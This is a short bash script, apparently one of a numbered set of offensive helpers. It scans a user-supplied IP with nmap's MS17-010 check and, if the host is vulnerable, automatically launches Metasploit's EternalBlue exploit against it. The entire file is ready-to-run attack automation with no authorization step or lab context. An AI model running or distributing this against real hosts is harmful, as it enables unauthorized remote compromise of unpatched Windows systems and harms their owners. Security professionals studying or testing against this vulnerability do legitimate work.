#!/usr/bin/env bash
# win_smb_exp.sh
# 5. Windows SMB Exploit Helper
# Checks for MS17-010 using nmap and launches Metasploit EternalBlue if vulnerable.
# Usage: ./win_smb_exp.sh
# Requires: nmap, msfconsole

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux" ;;
    Darwin*) echo "darwin" ;;
    *) echo "unknown" ;;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] Installing $t..."
    if [[ "$(detect_os)" == "darwin" ]]; then brew install "$t"; else sudo apt-get update && sudo apt-get install -y "$t"; fi
  fi
}

function get_credentials() {
  read -rp "Enter target IP: " TARGET
}

ensure_tool nmap
ensure_tool msfconsole
get_credentials

# Check MS17-010
nmap -p445 --script smb-vuln-ms17-010 -oN smb_ms17_010_${TARGET}.txt ${TARGET}
if grep -q "VULNERABLE" smb_ms17_010_${TARGET}.txt; then
  echo "[*] Vulnerable! Launching EternalBlue exploit..."
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST ${TARGET}; run; exit"
fi
